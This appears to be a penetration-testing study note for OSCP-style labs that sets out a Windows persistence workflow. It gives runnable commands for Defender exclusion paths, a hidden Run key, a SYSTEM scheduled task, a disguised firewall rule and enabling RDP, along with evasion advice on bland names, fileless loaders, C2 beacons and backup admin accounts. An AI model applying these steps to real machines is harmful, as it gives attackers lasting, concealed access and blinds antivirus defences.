---
title: Windows Persistence Flow
category: persistence
created: 2026-08-12
tags:
- technique
- persistence
permalink: oscp/techniques/windows-persistence-flow
---

# Windows Persistence Flow

## What it is
- Keeping access to a Windows box by having the *target* call back to us on a schedule, so access survives reboots and dropped shells
- Core model: reverse shell = **target connects OUT to us** (see [[Reverse Shell]]). We never connect in. We only need our listener up when the target calls home.

## When to use it
- After any initial shell on a Windows target, before doing anything noisy
- Labs (CPTS/HTB/OSCP): Kali on the VPN (`tun0`) is directly reachable — no VPS needed
- Real world: home Kali is behind NAT (router's private network, target can't route back) → need a **VPS** with a public IP, or a tunnel (ngrok etc.)
- VPS IPs are effectively static (stay attached to the instance) — that's why payloads hardcode them. Home IPs are dynamic.

## The two cops
| Cop | Checks | Effect on us |
|---|---|---|
| **Windows Firewall** | *Direction* of traffic | Default = block unsolicited **inbound**, allow all **outbound** → reverse shells pass for free. Only matters for inbound stuff (RDP, SMB, bind shell). Creating tasks/registry keys is a *local* action — firewall never sees it. |
| **Windows Defender** | *Content* of code | **AMSI** (Antimalware Scan Interface) scans PowerShell *in memory at execution* → kills known payloads when the task fires, not when created. This is what actually blocks us. |

## Commands

#### Check if we're actually elevated (UAC)
```powershell
whoami /groups | findstr /i "Mandatory"
```
- `Medium Mandatory Level` → admin on paper only, need UAC bypass
- `High Mandatory Level` → real admin power
- **UAC** = User Account Control, the "allow this app?" prompt — admin users run unelevated by default

#### Defender exclusion (needs admin; Tamper Protection does NOT block this)
```powershell
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\UpdateMgr"
```
- Anything in that folder is now invisible to Defender → drop tools/payloads there

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
- ❌ blocked/reverted by **Tamper Protection** (Defender self-defense, on by default) — even as admin. Use exclusions instead.

#### Persistence — Run key (survives reboot for that user, no admin needed)
```powershell
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -w hidden -c <payload>"
```

#### Persistence — scheduled task as SYSTEM (needs admin)
```powershell
schtasks /create /tn "UpdateMgr" /tr "C:\ProgramData\Microsoft\UpdateMgr\updater.exe" /sc onstart /ru SYSTEM
```
- `/sc onstart` run at boot — `/sc onlogon` also common
- `/ru SYSTEM` run as SYSTEM account

#### Firewall — poke ONE quiet hole instead of disabling (needs admin)
```powershell
netsh advfirewall firewall add rule name="Windows Update Helper" dir=in action=allow protocol=TCP localport=443
```
- Full disable (`netsh advfirewall set allprofiles state off`) works but is LOUD (event logs, EDR alerts) and pointless for outbound shells

#### Optional: enable RDP for front-door access (needs admin)
```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
```

## The ideal flow
1. **Initial shell** — whatever got us in, even a janky nc shell
2. **Neutralize AV for our tools** — exclusion folder (if admin) or obfuscated/evasive payload (if not)
3. **Stage payload** — bland name in a bland, legit-looking location: `C:\ProgramData\...`, `C:\Windows\Temp\`, `C:\Users\Public\`
4. **Persistence** — scheduled task as SYSTEM (or Run key if no admin)
5. **Callback** — implant beacons out on an interval with **jitter** (randomized timing so it doesn't look robotic); we catch sessions whenever
6. **Backups** — second persistence method, our own local admin account, RDP — so one cleanup doesn't lock us out

## Gotchas / troubleshooting
- **Blend in, don't hide** — `attrib +h` hidden folders fool nobody; AV ignores the hidden attribute entirely. A file named `OneDriveSync.exe` in ProgramData beats `shell.exe` on the Desktop.
- **Admin ≠ exempt from AV** — Defender scans admins too. Default `mimikatz` dies even from an elevated shell. Exclusion *first*, then tools.
- **Admin user ≠ elevated shell** — check integrity level before assuming privileges work (UAC).
- **Disabling the firewall gains nothing for reverse shells** — outbound is already allowed. It only enables inbound (RDP/SMB/bind shells) and it's noisy.
- **Raw nc shells are fragile** — die on disconnect, no encryption, no reconnect. Real access = C2 implant (Sliver, Havoc, Meterpreter) that self-heals and encrypts traffic.
- **Fileless > on-disk** when possible — anything written to disk is something AV can scan; keep payloads in memory, store only a small loader in persistence.
- **Exclusions are the gap** — Tamper Protection guards the kill-switch but not exclusions. That's the standard move.

## Tools
- `nc` / netcat — quick lab listener
- Sliver, Havoc, Meterpreter — C2 implants (beaconing, encryption, reconnects)
- `schtasks`, `netsh`, `reg` — built-in Windows tools (LOLBins = less foreign code to catch)

## Boxes where I used this
- [[]]

## References
- [HackTricks](https://book.hacktricks.wiki) — Windows persistence techniques
- [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/) — persistence + AV evasion sections